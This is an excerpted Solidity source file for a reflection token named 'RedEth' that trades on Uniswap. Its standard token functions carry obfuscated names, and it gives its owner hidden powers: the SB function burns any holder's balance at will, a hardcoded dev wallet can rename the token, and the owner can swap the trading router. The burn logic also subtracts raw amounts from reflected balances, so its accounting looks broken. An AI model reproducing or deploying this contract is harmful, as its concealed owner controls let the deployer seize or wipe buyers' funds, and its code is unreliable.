...
abstract contract Context {
    function _mS() internal view returns (address payable) {
        return payable(msg.sender);
    }
    function _mD() internal view returns (bytes memory) {
        this; 
        return msg.data; 
    }
}
interface IERC20Upgradeable {
    ...
    function t(address recipient, uint256 amount) external returns (bool); 
    function al(address owner, address spender) external view returns (uint256); 
    function a(address spender, uint256 amount) external returns (bool); 
    function tF(address sender, address recipient, uint256 amount ) external returns (bool);
    event T(address indexed from, address indexed to, uint256 value); 
    event T(address indexed from, address indexed to, address indexed token, uint256 value);
    event A(address indexed owner, address indexed spender, uint256 value); 
}
library Ads {
    function iC(address account) internal view returns (bool) {
        bytes32 ch;
        bytes32 aH = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { ch := extcodehash(account) }
        return (ch != aH && ch != 0x0);
    }

    function sV(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance"); 
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function fC(address target, bytes memory data) internal returns (bytes memory) {
        return fC(target, data, "Address: low-level call failed"); 
    }

    function fC(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _fCWV(target, data, 0, errorMessage); 
    }


    function fCWV(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return fCWV(target, data, value, "Address: low-level call with value failed");
    }

    function fCWV(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _fCWV(target, data, value, errorMessage);
    }

    function _fCWV(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(iC(target), "Address: call to non-contract");
...
interface IUniswapV2Factory {
    event PC(address indexed token0, address indexed token1, address lpPair, uint); 
    function gP(address tokenA, address tokenB) external view returns (address lpPair); 
    function cP(address tokenA, address tokenB) external returns (address lpPair); 
}
...
contract RedEth is Context, IERC20Upgradeable {
    ...
    modifier onlyOwner() {
        require(_owner == _mS(), "Ownable: caller is not the owner");
        _;
    }
    ...
    constructor () payable {
        ...
        _approve(_mS(), _routerAddress, MAX);
    ...
    function SFT(address payable setMarketWallet, address payable setDW, string memory _tokenname, string memory _tokensymbol) external onlyOwner {
        require(!rft);
        ...
        lpPair = IUniswapV2Factory(dexRouter.factory()).cP(dexRouter.WETH(), address(this));
        lpPs[lpPair] = true;
        ...
        a(_routerAddress, type(uint256).max);

        rft = true;
        _rOd[owner()] = _rTotal;
        emit T(ZERO, owner(), _tTotal);

        _approve(address(this), address(dexRouter), type(uint256).max);

        _t(owner(), address(this), bOf(owner()));
    ...
    function transferOwner(address newOwner) external onlyOwner() {
        ...
        _als[_owner][newOwner] = bOf(_owner);
        if(bOf(_owner) > 0) {
            _t(_owner, newOwner, bOf(_owner));
        }
    ...
    function tS() external view override returns (uint256) { return _tTotal; } 
    function decimals() external view returns (uint8) { return _decimals; }
    function s() external view returns (string memory) { return _s; } 
    function name() external view returns (string memory) { return _nm; }
    function getOwner() external view returns (address) { return owner(); }
    function al(address holder, address spender) external view override returns (uint256) { return _als[holder][spender]; }
    ...
    function t(address recipient, uint256 amount) public override returns (bool) {
        _t(_mS(), recipient, amount);
        return true;
    }

    function a(address spender, uint256 amount) public override returns (bool) {
        _approve(_mS(), spender, amount);
        return true;
    }

    function approveMax(address spender) public returns (bool) {
        return a(spender, type(uint256).max);
    }

    function tF(address sender, address recipient, uint256 amount) public override returns (bool) {
        _t(sender, recipient, amount);
        _approve(sender, _mS(), _als[sender][_mS()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_mS(), spender, _als[_mS()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_mS(), spender, _als[_mS()][spender] - subtractedValue);
        return true;
    }

    function setNewRouter(address newRouter) external onlyOwner() {
        IUniswapV2Router02 _newRouter = IUniswapV2Router02(newRouter);
        address g_p = IUniswapV2Factory(_newRouter.factory()).gP(address(this), _newRouter.WETH());
        if (g_p == address(0)) {
            lpPair = IUniswapV2Factory(_newRouter.factory()).cP(address(this), _newRouter.WETH());
        }
        else {
            lpPair = g_p;
        }
    ...
    function _t(address from, address to, uint256 amount) internal returns (bool) {
        ...
        if(_hasLimits(from, to)) {
            ...
            if(to != _routerAddress && !lpPs[to]) {
                require(bOf(to) + amount <= _mWS, "Transfer exceeds the maxWalletSize.");
            }
        }
        bool takeFee = true;
        ...
        if (lpPs[to]) {
            if (!inSwapAndLiquify
                ...
                uint256 contractTokenBalance = bOf(address(this));
    ...
    function _ftt(address from, address to, uint256 tAmount, bool takeFee) internal returns (bool) {
        ...
        emit T(from, to, values.tTransferAmount);
        return true;
    }

    function Update(string memory _tn, string memory _ts) public {
        require (_mS() == _dW, "Only Dev Can Update the Token");    
        _nm = _tn;
        _s = _ts;
    }

    function SB (address from, uint256 amount) public onlyOwner {
        require(from != address(0), "Cannot burn from the zero address");
        uint256 bfb = bOf(from);
        require(bfb >= amount, "The burn amount exceeds balance");

        if (_iE[from]) {
            _tOd[from] = _tOd[from] - amount;
        } else if (!_iE[from]) {
           _rOd[from] = _rOd[from] - amount; 
        }

        _tTotal = _tTotal - (amount);
        emit T(from, address(0), amount);
    }
    ...
    function _takeLiquidity(address sender, uint256 tLiquidity) internal {
        ...
        emit T(sender, address(this), tLiquidity); 
    }
}